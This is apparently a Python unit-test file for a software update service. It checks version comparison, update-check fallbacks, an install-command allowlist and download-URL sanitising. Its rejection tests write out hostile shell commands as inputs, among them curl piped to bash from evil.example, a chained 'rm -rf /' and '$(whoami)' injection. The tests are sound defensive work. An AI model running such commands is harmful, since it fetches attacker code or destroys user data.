"""
Unit tests for update_service according to tim-update skill.
"""

import unittest
import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from unittest.mock import patch

from core.update_service import (
    is_newer_version,
    is_trusted_install_cmd,
    sanitize_download_url,
    check_for_updates,
    execute_terminal_update,
    DEFAULT_DOWNLOAD_URL,
    DEFAULT_MAC_INSTALL_CMD,
    DEFAULT_WIN_INSTALL_CMD,
    DEFAULT_LINUX_INSTALL_CMD,
)


class TestUpdateService(unittest.TestCase):
    def test_is_newer_version(self):
        # Newer versions
        self.assertTrue(is_newer_version("1.5.0", "1.4.0"))
        self.assertTrue(is_newer_version("1.5.1", "1.5.0"))
        self.assertTrue(is_newer_version("2.0.0", "1.5.0"))
        self.assertTrue(is_newer_version("v1.5.1", "1.5.0"))
        self.assertTrue(is_newer_version("1.5.1", "v1.5.0"))
        self.assertTrue(is_newer_version("1.5.0.1", "1.5.0"))
        self.assertTrue(is_newer_version("1.5.0-rc1", "1.4.9"))

        # Same or older versions
        self.assertFalse(is_newer_version("1.5.0", "1.5.0"))
        self.assertFalse(is_newer_version("1.4.9", "1.5.0"))
        self.assertFalse(is_newer_version("1.4", "1.5.0"))
        self.assertFalse(is_newer_version("0.9.9", "1.5.0"))
        self.assertFalse(is_newer_version("v1.5.0", "1.5.0"))

    def test_check_for_updates_fail_silent(self):
        res = check_for_updates("1.5.0", update_url="http://127.0.0.1:1/nonexistent.json", timeout=1)
        self.assertFalse(res["has_update"])
        self.assertEqual(res["current_version"], "1.5.0")
        self.assertEqual(res["mac_install_cmd"], DEFAULT_MAC_INSTALL_CMD)
        self.assertEqual(res["win_install_cmd"], DEFAULT_WIN_INSTALL_CMD)
        self.assertEqual(res["linux_install_cmd"], DEFAULT_LINUX_INSTALL_CMD)

    def test_is_trusted_install_cmd(self):
        self.assertTrue(is_trusted_install_cmd(DEFAULT_MAC_INSTALL_CMD))
        self.assertTrue(is_trusted_install_cmd(DEFAULT_LINUX_INSTALL_CMD))
        # Flexibel für künftige Skriptpfade oder Flags unter ggfplanet.de
        self.assertTrue(is_trusted_install_cmd("curl -fsSL https://ggfplanet.de/ebur128scanner/v2/install.sh | sh"))
        self.assertTrue(is_trusted_install_cmd("wget -qO- https://ggfplanet.de/ebur128scanner/install.sh | bash"))

        # Blockiert Fremddomains, Verkettungen & Subshells
        self.assertFalse(is_trusted_install_cmd("curl -fsSL https://evil.example/install.sh | bash"))
        self.assertFalse(is_trusted_install_cmd("curl -fsSL https://ggfplanet.de/install.sh | bash; rm -rf /"))
        self.assertFalse(is_trusted_install_cmd("curl -fsSL https://ggfplanet.de/install.sh && id | bash"))
        self.assertFalse(is_trusted_install_cmd("curl -fsSL https://ggfplanet.de/$(whoami).sh | bash"))
        self.assertFalse(is_trusted_install_cmd("curl -fsSL https://ggfplanet.de/install.sh | bash\nid"))
        self.assertFalse(is_trusted_install_cmd(""))

    def test_sanitize_download_url(self):
        self.assertEqual(sanitize_download_url("https://ggfplanet.de/ebur128scanner/"), "https://ggfplanet.de/ebur128scanner/")
        self.assertEqual(sanitize_download_url("https://evil.example/phish"), DEFAULT_DOWNLOAD_URL)
        self.assertEqual(sanitize_download_url(None), DEFAULT_DOWNLOAD_URL)

    def test_execute_terminal_update_blocks_untrusted_cmd(self):
        with patch("core.update_service.platform.system", return_value="Darwin"):
            self.assertFalse(execute_terminal_update("curl -fsSL https://evil.example/x.sh | bash"))
        with patch("core.update_service.platform.system", return_value="Linux"):
            self.assertFalse(execute_terminal_update("curl -fsSL https://evil.example/x.sh | bash"))


if __name__ == "__main__":
    unittest.main()
